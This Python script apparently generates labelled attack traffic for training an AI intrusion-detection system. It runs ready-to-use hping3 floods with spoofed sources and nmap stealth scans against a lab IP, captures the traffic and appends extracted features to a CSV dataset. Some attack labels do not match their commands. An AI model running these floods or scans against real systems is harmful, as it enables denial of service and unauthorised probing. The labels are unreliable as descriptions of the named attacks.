import os
import time
import subprocess
from datetime import datetime
import pandas as pd


INTERFACE = "eth0"
# Define the IPs
victim_ip = "192.168.171.151"
attacker_ip = "172.24.240.1"
capture_dir = "./captures"
csv_output_dir = "./csv_outputs"
capture_duration = 20


# Ensure the folders exist
os.makedirs(capture_dir, exist_ok=True)
os.makedirs(csv_output_dir, exist_ok=True)

# Attack commands dictionary
attacks = {
    "neptune": f"nmap -Pn -T4 -sS -p 22,80,443 {victim_ip}",
    "smurf": f"hping3 -1 --flood --spoof {victim_ip} {victim_ip}",
    "teardrop": f"hping3 -c 10000 -d 1400 -S -w 64 -p 53 --flood --rand-source {victim_ip}",
    "back": f"hping3 -c 10000 -d 120 -S -w 64 -p 80 --flood {victim_ip}",
    "pod": f"hping3 -c 5000 -d 65495 -S -p 80 --flood {victim_ip}",
    "land": f"hping3 -S -p 80 -a {victim_ip} {victim_ip}",
    "ipsweep": f"nmap -sn -Pn 192.168.171.0/24",
    "portsweep": f"nmap -Pn -p 1-1024 {victim_ip}",

    "udp_flood": f"hping3 --udp -p 53 --flood {victim_ip}",
    "xmas_scan": f"nmap -sX -Pn {victim_ip}",
    "fin_scan": f"nmap -sF -Pn {victim_ip}",
    "null_scan": f"nmap -sN -Pn {victim_ip}",
    "syn_ack_flood": f"hping3 -S -A --flood -p 80 {victim_ip}",
    "dns_flood": f"hping3 -2 -p 53 --flood --rand-source {victim_ip}",
    "ntp_amplification": f"hping3 -2 -p 123 --flood --rand-source {victim_ip}",
    "http_get_flood": f"hping3 -S -p 80 -d 120 --flood --data 0x474554202f20485454502f312e310d0a0d0a {victim_ip}",


}

attack_durations = {label: capture_duration for label in attacks}



def run_attack(label):
    print(f"[*] Running attack: {label}")
    cmd = attacks[label]
    duration = attack_durations.get(label, 20)

    try:
        subprocess.run(cmd, shell=True, timeout=duration)
    except subprocess.TimeoutExpired:
        print(f"[!] Attack {label} exceeded duration and was terminated.")


def extract_csv(pcap_path, csv_path):
    try:
        print(f"[+] Extracting CSV from: {pcap_path}")
        subprocess.run([
            "/mnt/d/Projects/ai_ids_project/venv/bin/python",
            "feature_extractor_patched_final.py",
            pcap_path,
            "--output", csv_path
        ], check=True)
        print(f"[✓] CSV saved: {csv_path}")

        
        merged_path = "../data/processed/realtime_merged.csv"
        

        df = pd.read_csv(csv_path)
        df["label"] = os.path.basename(csv_path).split("_")[0]  # Add attack label from filename

        if os.path.exists(merged_path):
            df.to_csv(merged_path, mode="a", index=False, header=False)
        else:
            df.to_csv(merged_path, index=False)
        print(f"[+] Appended data to {merged_path}")

    except subprocess.CalledProcessError as e:
        print(f"[!] CSV extraction failed: {e}")
    except Exception as e:
        print(f"[!] Error appending to realtime_merged.csv: {e}")


# Run capture + attack
def run_capture(label):
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    pcap_filename = f"{label}_{timestamp}.pcap"
    csv_filename = f"{label}_{timestamp}.csv"
    pcap_path = os.path.join(capture_dir, pcap_filename)
    csv_path = os.path.join(csv_output_dir, csv_filename)

    print(f"[+] Starting capture: {label} → {pcap_path} on interface {INTERFACE}")

    try:
        tcpdump_proc = subprocess.Popen(
            ["sudo", "tcpdump", "-i", INTERFACE, "-w", pcap_path, "not", "port", "22"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.PIPE
        )

        time.sleep(2)  
        run_attack(label)
        time.sleep(attack_durations.get(label)) 
        tcpdump_proc.terminate()
        _, stderr = tcpdump_proc.communicate()

        if stderr:
            print(f"[!] tcpdump error: {stderr.decode().strip()}")

        if os.path.exists(pcap_path) and os.path.getsize(pcap_path) > 100:
            print(f"[✓] Saved: {pcap_path}")
            extract_csv(pcap_path, csv_path)
        else:
            print(f"[!] Failed to save pcap: {pcap_path}")

    except Exception as e:
        print(f"[!] Error during capture: {e}")

# Main runner
if __name__ == "__main__":
    for label in attacks:
        run_capture(label)
        print("-" * 60)
